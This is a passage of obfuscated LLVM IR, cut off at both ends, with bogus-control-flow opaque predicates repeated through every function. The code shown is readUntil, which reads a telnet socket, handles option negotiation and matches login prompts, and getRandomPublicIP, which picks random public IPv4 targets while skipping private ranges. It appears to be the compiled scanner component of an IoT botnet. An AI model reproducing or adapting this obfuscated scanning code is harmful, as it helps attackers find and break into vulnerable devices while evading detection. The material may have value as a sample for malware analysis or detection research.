; <label>:120:                                    ; preds = %118, %originalBBpart24
  %121 = phi i1 [ false, %originalBBpart24 ], [ %119, %118 ]
  %122 = load i32, i32* @x.47
  %123 = load i32, i32* @y.48
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %120
  %130 = load i32, i32* @x.47
  %131 = load i32, i32* @y.48
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBBpart222, label %originalBB20alteredBB

originalBBpart222:                                ; preds = %originalBB20
  br i1 %121, label %138, label %157

; <label>:138:                                    ; preds = %originalBBpart222
  %139 = load i32, i32* @x.47
  %140 = load i32, i32* @y.48
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %138
  %147 = load i32, i32* %7, align 4
  %148 = add nsw i32 %147, 1
  store i32 %148, i32* %7, align 4
  %149 = load i32, i32* @x.47
  %150 = load i32, i32* @y.48
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBBpart228, label %originalBB24alteredBB

originalBBpart228:                                ; preds = %originalBB24
  br label %34

; <label>:157:                                    ; preds = %originalBBpart222
  %158 = load i8*, i8** %3, align 8
  %159 = load i32, i32* %5, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds i8, i8* %158, i64 %160
  %162 = load i32, i32* %7, align 4
  %163 = sext i32 %162 to i64
  %164 = sub i64 0, %163
  %165 = getelementptr inbounds i8, i8* %161, i64 %164
  %166 = load i8, i8* %165, align 1
  %167 = sext i8 %166 to i32
  %168 = load i8*, i8** %4, align 8
  %169 = load i32, i32* %6, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds i8, i8* %168, i64 %170
  %172 = load i8, i8* %171, align 1
  %173 = sext i8 %172 to i32
  %174 = icmp eq i32 %167, %173
  br i1 %174, label %175, label %192

; <label>:175:                                    ; preds = %157
  %176 = load i32, i32* @x.47
  %177 = load i32, i32* @y.48
  %178 = sub i32 %176, 1
  %179 = mul i32 %176, %178
  %180 = urem i32 %179, 2
  %181 = icmp eq i32 %180, 0
  %182 = icmp slt i32 %177, 10
  %183 = or i1 %181, %182
  br i1 %183, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %175
  store i32 1, i32* %2, align 4
  %184 = load i32, i32* @x.47
  %185 = load i32, i32* @y.48
  %186 = sub i32 %184, 1
  %187 = mul i32 %184, %186
  %188 = urem i32 %187, 2
  %189 = icmp eq i32 %188, 0
  %190 = icmp slt i32 %185, 10
  %191 = or i1 %189, %190
  br i1 %191, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %213

; <label>:192:                                    ; preds = %157
  br label %193

; <label>:193:                                    ; preds = %192
  %194 = load i32, i32* %6, align 4
  %195 = add nsw i32 %194, 1
  store i32 %195, i32* %6, align 4
  br label %11

; <label>:196:                                    ; preds = %originalBBpart2
  %197 = load i32, i32* @x.47
  %198 = load i32, i32* @y.48
  %199 = sub i32 %197, 1
  %200 = mul i32 %197, %199
  %201 = urem i32 %200, 2
  %202 = icmp eq i32 %201, 0
  %203 = icmp slt i32 %198, 10
  %204 = or i1 %202, %203
  br i1 %204, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %196
  store i32 0, i32* %2, align 4
  %205 = load i32, i32* @x.47
  %206 = load i32, i32* @y.48
  %207 = sub i32 %205, 1
  %208 = mul i32 %205, %207
  %209 = urem i32 %208, 2
  %210 = icmp eq i32 %209, 0
  %211 = icmp slt i32 %206, 10
  %212 = or i1 %210, %211
  br i1 %212, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %213

; <label>:213:                                    ; preds = %originalBBpart236, %originalBBpart232
  %214 = load i32, i32* @x.47
  %215 = load i32, i32* @y.48
  %216 = sub i32 %214, 1
  %217 = mul i32 %214, %216
  %218 = urem i32 %217, 2
  %219 = icmp eq i32 %218, 0
  %220 = icmp slt i32 %215, 10
  %221 = or i1 %219, %220
  br i1 %221, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %213
  %222 = load i32, i32* %2, align 4
  %223 = load i32, i32* @x.47
  %224 = load i32, i32* @y.48
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  ret i32 %222

originalBBalteredBB:                              ; preds = %originalBB, %11
  %231 = load i32, i32* %6, align 4
  %232 = sext i32 %231 to i64
  %233 = load i8*, i8** %4, align 8
  %234 = call i64 @strlen(i8* %233) #10
  %235 = icmp ult i64 %232, %234
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %34
  %236 = load i32, i32* %5, align 4
  %237 = load i32, i32* %7, align 4
  %238 = icmp sgt i32 %236, %237
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %66
  %239 = load i8*, i8** %3, align 8
  %240 = load i32, i32* %5, align 4
  %241 = sext i32 %240 to i64
  %242 = getelementptr inbounds i8, i8* %239, i64 %241
  %243 = load i32, i32* %7, align 4
  %244 = sext i32 %243 to i64
  %_ = sub i64 0, %244
  %gen = mul i64 %_, %244
  %_7 = sub i64 0, %244
  %gen8 = mul i64 %_7, %244
  %_9 = sub i64 0, 0
  %gen10 = add i64 %_9, %244
  %_11 = sub i64 0, %244
  %gen12 = mul i64 %_11, %244
  %_13 = sub i64 0, 0
  %gen14 = add i64 %_13, %244
  %_15 = sub i64 0, 0
  %gen16 = add i64 %_15, %244
  %245 = sub i64 0, %244
  %246 = getelementptr inbounds i8, i8* %242, i64 %245
  %247 = load i8, i8* %246, align 1
  %248 = sext i8 %247 to i32
  %249 = icmp eq i32 %248, 32
  br label %originalBB6

originalBB20alteredBB:                            ; preds = %originalBB20, %120
  br label %originalBB20

originalBB24alteredBB:                            ; preds = %originalBB24, %138
  %250 = load i32, i32* %7, align 4
  %_25 = sub i32 0, %250
  %gen26 = add i32 %_25, 1
  %251 = add nsw i32 %250, 1
  store i32 %251, i32* %7, align 4
  br label %originalBB24

originalBB30alteredBB:                            ; preds = %originalBB30, %175
  store i32 1, i32* %2, align 4
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %196
  store i32 0, i32* %2, align 4
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %213
  %252 = load i32, i32* %2, align 4
  br label %originalBB38
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.__sigset_t, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  br label %33

; <label>:33:                                     ; preds = %216, %8
  %34 = load i32, i32* %18, align 4
  %35 = add nsw i32 %34, 2
  %36 = load i32, i32* %16, align 4
  %37 = icmp slt i32 %35, %36
  br i1 %37, label %38, label %48

; <label>:38:                                     ; preds = %33
  %39 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %40 = load i64, i64* %39, align 8
  %41 = icmp sgt i64 %40, 0
  br i1 %41, label %46, label %42

; <label>:42:                                     ; preds = %38
  %43 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %44 = load i64, i64* %43, align 8
  %45 = icmp sgt i64 %44, 0
  br label %46

; <label>:46:                                     ; preds = %42, %38
  %47 = phi i1 [ true, %38 ], [ %45, %42 ]
  br label %48

; <label>:48:                                     ; preds = %46, %33
  %49 = phi i1 [ false, %33 ], [ %47, %46 ]
  br i1 %49, label %50, label %217

; <label>:50:                                     ; preds = %48
  %51 = load i32, i32* @x.49
  %52 = load i32, i32* @y.50
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %50
  %59 = load i32, i32* @x.49
  %60 = load i32, i32* @y.50
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %67

; <label>:67:                                     ; preds = %originalBBpart2
  %68 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %69 = getelementptr inbounds [16 x i64], [16 x i64]* %68, i64 0, i64 0
  %70 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %69) #2, !srcloc !4
  %71 = extractvalue { i64, i64* } %70, 0
  %72 = extractvalue { i64, i64* } %70, 1
  %73 = trunc i64 %71 to i32
  store i32 %73, i32* %24, align 4
  %74 = ptrtoint i64* %72 to i64
  %75 = trunc i64 %74 to i32
  store i32 %75, i32* %25, align 4
  br label %76

; <label>:76:                                     ; preds = %67
  %77 = load i32, i32* %10, align 4
  %78 = srem i32 %77, 64
  %79 = zext i32 %78 to i64
  %80 = shl i64 1, %79
  %81 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %82 = load i32, i32* %10, align 4
  %83 = sdiv i32 %82, 64
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds [16 x i64], [16 x i64]* %81, i64 0, i64 %84
  %86 = load i64, i64* %85, align 8
  %87 = or i64 %86, %80
  store i64 %87, i64* %85, align 8
  %88 = load i32, i32* %10, align 4
  %89 = add nsw i32 %88, 1
  %90 = call i32 @select(i32 %89, %struct.__sigset_t* %21, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %22)
  %91 = icmp slt i32 %90, 1
  br i1 %91, label %92, label %109

; <label>:92:                                     ; preds = %76
  %93 = load i32, i32* @x.49
  %94 = load i32, i32* @y.50
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %92
  %101 = load i32, i32* @x.49
  %102 = load i32, i32* @y.50
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %217

; <label>:109:                                    ; preds = %76
  %110 = load i8*, i8** %15, align 8
  %111 = load i32, i32* %18, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds i8, i8* %110, i64 %112
  store i8* %113, i8** %23, align 8
  %114 = load i32, i32* %10, align 4
  %115 = load i8*, i8** %23, align 8
  %116 = call i64 @recv(i32 %114, i8* %115, i64 1, i32 0)
  %117 = trunc i64 %116 to i32
  store i32 %117, i32* %19, align 4
  %118 = load i32, i32* %19, align 4
  %119 = icmp eq i32 %118, -1
  br i1 %119, label %123, label %120

; <label>:120:                                    ; preds = %109
  %121 = load i32, i32* %19, align 4
  %122 = icmp eq i32 %121, 0
  br i1 %122, label %123, label %124

; <label>:123:                                    ; preds = %120, %109
  store i32 0, i32* %9, align 4
  br label %238

; <label>:124:                                    ; preds = %120
  %125 = load i32, i32* %19, align 4
  %126 = load i32, i32* %18, align 4
  %127 = add nsw i32 %126, %125
  store i32 %127, i32* %18, align 4
  %128 = load i8*, i8** %23, align 8
  %129 = load i8, i8* %128, align 1
  %130 = zext i8 %129 to i32
  %131 = icmp eq i32 %130, 255
  br i1 %131, label %132, label %170

; <label>:132:                                    ; preds = %124
  %133 = load i32, i32* %10, align 4
  %134 = load i8*, i8** %23, align 8
  %135 = getelementptr inbounds i8, i8* %134, i64 1
  %136 = call i64 @recv(i32 %133, i8* %135, i64 2, i32 0)
  %137 = trunc i64 %136 to i32
  store i32 %137, i32* %19, align 4
  %138 = load i32, i32* %19, align 4
  %139 = icmp eq i32 %138, -1
  br i1 %139, label %143, label %140

; <label>:140:                                    ; preds = %132
  %141 = load i32, i32* %19, align 4
  %142 = icmp eq i32 %141, 0
  br i1 %142, label %143, label %144

; <label>:143:                                    ; preds = %140, %132
  store i32 0, i32* %9, align 4
  br label %238

; <label>:144:                                    ; preds = %140
  %145 = load i32, i32* %19, align 4
  %146 = load i32, i32* %18, align 4
  %147 = add nsw i32 %146, %145
  store i32 %147, i32* %18, align 4
  %148 = load i32, i32* %10, align 4
  %149 = load i8*, i8** %23, align 8
  %150 = call i32 @negotiate(i32 %148, i8* %149, i32 3)
  %151 = icmp ne i32 %150, 0
  br i1 %151, label %169, label %152

; <label>:152:                                    ; preds = %144
  %153 = load i32, i32* @x.49
  %154 = load i32, i32* @y.50
  %155 = sub i32 %153, 1
  %156 = mul i32 %153, %155
  %157 = urem i32 %156, 2
  %158 = icmp eq i32 %157, 0
  %159 = icmp slt i32 %154, 10
  %160 = or i1 %158, %159
  br i1 %160, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %152
  store i32 0, i32* %9, align 4
  %161 = load i32, i32* @x.49
  %162 = load i32, i32* @y.50
  %163 = sub i32 %161, 1
  %164 = mul i32 %161, %163
  %165 = urem i32 %164, 2
  %166 = icmp eq i32 %165, 0
  %167 = icmp slt i32 %162, 10
  %168 = or i1 %166, %167
  br i1 %168, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %238

; <label>:169:                                    ; preds = %144
  br label %216

; <label>:170:                                    ; preds = %124
  %171 = load i8*, i8** %15, align 8
  %172 = load i8*, i8** %11, align 8
  %173 = call i8* @strstr(i8* %171, i8* %172) #10
  %174 = icmp ne i8* %173, null
  br i1 %174, label %214, label %175

; <label>:175:                                    ; preds = %170
  %176 = load i32, i32* @x.49
  %177 = load i32, i32* @y.50
  %178 = sub i32 %176, 1
  %179 = mul i32 %176, %178
  %180 = urem i32 %179, 2
  %181 = icmp eq i32 %180, 0
  %182 = icmp slt i32 %177, 10
  %183 = or i1 %181, %182
  br i1 %183, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %175
  %184 = load i32, i32* %12, align 4
  %185 = icmp ne i32 %184, 0
  %186 = load i32, i32* @x.49
  %187 = load i32, i32* @y.50
  %188 = sub i32 %186, 1
  %189 = mul i32 %186, %188
  %190 = urem i32 %189, 2
  %191 = icmp eq i32 %190, 0
  %192 = icmp slt i32 %187, 10
  %193 = or i1 %191, %192
  br i1 %193, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %185, label %194, label %215

; <label>:194:                                    ; preds = %originalBBpart212
  %195 = load i32, i32* @x.49
  %196 = load i32, i32* @y.50
  %197 = sub i32 %195, 1
  %198 = mul i32 %195, %197
  %199 = urem i32 %198, 2
  %200 = icmp eq i32 %199, 0
  %201 = icmp slt i32 %196, 10
  %202 = or i1 %200, %201
  br i1 %202, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %194
  %203 = load i8*, i8** %15, align 8
  %204 = call i32 @matchPrompt(i8* %203)
  %205 = icmp ne i32 %204, 0
  %206 = load i32, i32* @x.49
  %207 = load i32, i32* @y.50
  %208 = sub i32 %206, 1
  %209 = mul i32 %206, %208
  %210 = urem i32 %209, 2
  %211 = icmp eq i32 %210, 0
  %212 = icmp slt i32 %207, 10
  %213 = or i1 %211, %212
  br i1 %213, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %205, label %214, label %215

; <label>:214:                                    ; preds = %originalBBpart216, %170
  store i32 1, i32* %20, align 4
  br label %217

; <label>:215:                                    ; preds = %originalBBpart216, %originalBBpart212
  br label %216

; <label>:216:                                    ; preds = %215, %169
  br label %33

; <label>:217:                                    ; preds = %214, %originalBBpart24, %48
  %218 = load i32, i32* %20, align 4
  %219 = icmp ne i32 %218, 0
  br i1 %219, label %220, label %221

; <label>:220:                                    ; preds = %217
  store i32 1, i32* %9, align 4
  br label %238

; <label>:221:                                    ; preds = %217
  %222 = load i32, i32* @x.49
  %223 = load i32, i32* @y.50
  %224 = sub i32 %222, 1
  %225 = mul i32 %222, %224
  %226 = urem i32 %225, 2
  %227 = icmp eq i32 %226, 0
  %228 = icmp slt i32 %223, 10
  %229 = or i1 %227, %228
  br i1 %229, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %221
  store i32 0, i32* %9, align 4
  %230 = load i32, i32* @x.49
  %231 = load i32, i32* @y.50
  %232 = sub i32 %230, 1
  %233 = mul i32 %230, %232
  %234 = urem i32 %233, 2
  %235 = icmp eq i32 %234, 0
  %236 = icmp slt i32 %231, 10
  %237 = or i1 %235, %236
  br i1 %237, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %238

; <label>:238:                                    ; preds = %originalBBpart220, %220, %originalBBpart28, %143, %123
  %239 = load i32, i32* %9, align 4
  ret i32 %239

originalBBalteredBB:                              ; preds = %originalBB, %50
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %92
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %152
  store i32 0, i32* %9, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %175
  %240 = load i32, i32* %12, align 4
  %241 = icmp ne i32 %240, 0
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %194
  %242 = load i8*, i8** %15, align 8
  %243 = call i32 @matchPrompt(i8* %242)
  %244 = icmp ne i32 %243, 0
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %221
  store i32 0, i32* %9, align 4
  br label %originalBB18
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [16 x i8], align 16
  %3 = alloca [16 x i8], align 16
  %4 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %5 = zext i8 %4 to i32
  %6 = icmp sgt i32 %5, 0
  br i1 %6, label %7, label %43

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @x.51
  %9 = load i32, i32* @y.52
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %17 = zext i8 %16 to i32
  %18 = icmp slt i32 %17, 255
  %19 = load i32, i32* @x.51
  %20 = load i32, i32* @y.52
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %18, label %27, label %43

; <label>:27:                                     ; preds = %originalBBpart2
  %28 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %29 = add i8 %28, 1
  store i8 %29, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %30 = bitcast [16 x i8]* %2 to i8*
  call void @llvm.memset.p0i8.i64(i8* %30, i8 0, i64 16, i32 16, i1 false)
  %31 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %32 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %33 = zext i8 %32 to i32
  %34 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %35 = zext i8 %34 to i32
  %36 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %37 = zext i8 %36 to i32
  %38 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %39 = zext i8 %38 to i32
  %40 = call i32 (i8*, i8*, ...) @szprintf(i8* %31, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.46, i32 0, i32 0), i32 %33, i32 %35, i32 %37, i32 %39)
  %41 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %42 = call i32 @inet_addr(i8* %41) #2
  store i32 %42, i32* %1, align 4
  br label %1189

; <label>:43:                                     ; preds = %originalBBpart2, %0
  %44 = call i32 @rand() #2
  %45 = srem i32 %44, 255
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %47 = call i32 @rand() #2
  %48 = srem i32 %47, 255
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %50 = call i32 @rand() #2
  %51 = srem i32 %50, 255
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %53 = call i32 @rand() #2
  %54 = srem i32 %53, 255
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  br label %56

; <label>:56:                                     ; preds = %1162, %43
  %57 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %58 = zext i8 %57 to i32
  %59 = icmp eq i32 %58, 0
  br i1 %59, label %1160, label %60

; <label>:60:                                     ; preds = %56
  %61 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %62 = zext i8 %61 to i32
  %63 = icmp eq i32 %62, 10
  br i1 %63, label %1160, label %64

; <label>:64:                                     ; preds = %60
  %65 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 %66, 100
  br i1 %67, label %68, label %92

; <label>:68:                                     ; preds = %64
  %69 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %70 = zext i8 %69 to i32
  %71 = icmp sge i32 %70, 64
  br i1 %71, label %72, label %92

; <label>:72:                                     ; preds = %68
  %73 = load i32, i32* @x.51
  %74 = load i32, i32* @y.52
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %72
  %81 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %82 = zext i8 %81 to i32
  %83 = icmp sle i32 %82, 127
  %84 = load i32, i32* @x.51
  %85 = load i32, i32* @y.52
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %83, label %1160, label %92

; <label>:92:                                     ; preds = %originalBBpart24, %68, %64
  %93 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %94 = zext i8 %93 to i32
  %95 = icmp eq i32 %94, 127
  br i1 %95, label %1160, label %96

; <label>:96:                                     ; preds = %92
  %97 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %98 = zext i8 %97 to i32
  %99 = icmp eq i32 %98, 169
  br i1 %99, label %100, label %104

; <label>:100:                                    ; preds = %96
  %101 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %102 = zext i8 %101 to i32
  %103 = icmp eq i32 %102, 254
  br i1 %103, label %1160, label %104

; <label>:104:                                    ; preds = %100, %96
  %105 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %106 = zext i8 %105 to i32
  %107 = icmp eq i32 %106, 172
  br i1 %107, label %108, label %116

; <label>:108:                                    ; preds = %104
  %109 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %110 = zext i8 %109 to i32
  %111 = icmp sle i32 %110, 16
  br i1 %111, label %112, label %116

; <label>:112:                                    ; preds = %108
  %113 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %114 = zext i8 %113 to i32
  %115 = icmp sle i32 %114, 31
  br i1 %115, label %1160, label %116

; <label>:116:                                    ; preds = %112, %108, %104
  %117 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %118 = zext i8 %117 to i32
  %119 = icmp eq i32 %118, 192
  br i1 %119, label %120, label %160

; <label>:120:                                    ; preds = %116
  %121 = load i32, i32* @x.51
  %122 = load i32, i32* @y.52
  %123 = sub i32 %121, 1
  %124 = mul i32 %121, %123
  %125 = urem i32 %124, 2
  %126 = icmp eq i32 %125, 0
  %127 = icmp slt i32 %122, 10
  %128 = or i1 %126, %127
  br i1 %128, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %120
  %129 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %130 = zext i8 %129 to i32
  %131 = icmp eq i32 %130, 0
  %132 = load i32, i32* @x.51
  %133 = load i32, i32* @y.52
  %134 = sub i32 %132, 1
  %135 = mul i32 %132, %134
  %136 = urem i32 %135, 2
  %137 = icmp eq i32 %136, 0
  %138 = icmp slt i32 %133, 10
  %139 = or i1 %137, %138
  br i1 %139, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %131, label %140, label %160

; <label>:140:                                    ; preds = %originalBBpart28
  %141 = load i32, i32* @x.51
  %142 = load i32, i32* @y.52
  %143 = sub i32 %141, 1
  %144 = mul i32 %141, %143
  %145 = urem i32 %144, 2
  %146 = icmp eq i32 %145, 0
  %147 = icmp slt i32 %142, 10
  %148 = or i1 %146, %147
  br i1 %148, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %140
  %149 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %150 = zext i8 %149 to i32
  %151 = icmp eq i32 %150, 2
  %152 = load i32, i32* @x.51
  %153 = load i32, i32* @y.52
  %154 = sub i32 %152, 1
  %155 = mul i32 %152, %154
  %156 = urem i32 %155, 2
